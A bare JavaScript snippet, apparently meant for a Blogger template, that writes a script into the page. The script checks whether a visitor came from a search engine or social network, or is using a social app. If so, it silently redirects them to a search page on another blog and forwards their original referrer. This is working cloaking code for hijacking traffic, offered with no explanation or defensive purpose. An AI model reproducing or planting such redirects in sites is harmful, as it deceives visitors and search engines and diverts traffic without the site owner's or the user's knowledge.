document.writeln('<script>');
document.writeln('var postTitles = &quot;<data:blog.searchQuery/>&quot;;');
document.writeln('  //<![CDATA[');
document.writeln('var ars = \'https://alxalalive.blogspot.com\';');
document.writeln('');
document.writeln('if([\'.google.\', \'bing.\', \'yandex.\', \'facebook.\', \'pinterest.\'].some(s => document.referrer.toLowerCase().includes(s)) || [\'fb\', \'facebook\', \'pinterest\', \'twitter\'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + \'/search?q=\' + encodeURIComponent(postTitles) + \'&arsae_ref=\'+ encodeURIComponent(document.referrer) }');
document.writeln('//]]>');
document.writeln('</script>');
